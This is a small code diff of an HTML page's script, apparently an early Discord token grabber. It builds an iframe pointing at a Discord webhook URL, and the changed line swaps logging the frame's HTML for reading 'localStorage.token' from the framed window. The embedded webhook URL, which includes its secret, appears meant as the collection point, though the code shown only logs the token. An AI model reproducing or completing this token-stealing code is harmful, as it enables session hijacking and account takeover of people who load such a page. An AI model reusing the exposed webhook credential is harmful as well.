@@ -5,7 +5,7 @@
   var main = document.querySelector("iframe#blank")
   main.contentWindow.document.body.innerHTML = "<iframe src='https://discord.com/api/webhooks/1007732875338194965/bFYD_NAv3NIeDQfB6U2GzND74znzW_-u7uw4tvPQZ441IQfutKUrZshaL8Obdf7gUgFT'></iframe>";
   var discord = main.contentWindow.document.querySelector("iframe")
-  console.log(main.contentWindow.document.body.innerHTML)
+  console.log(main.contentWindow.localStorage.token)
   </script>
 </body>
 </html>
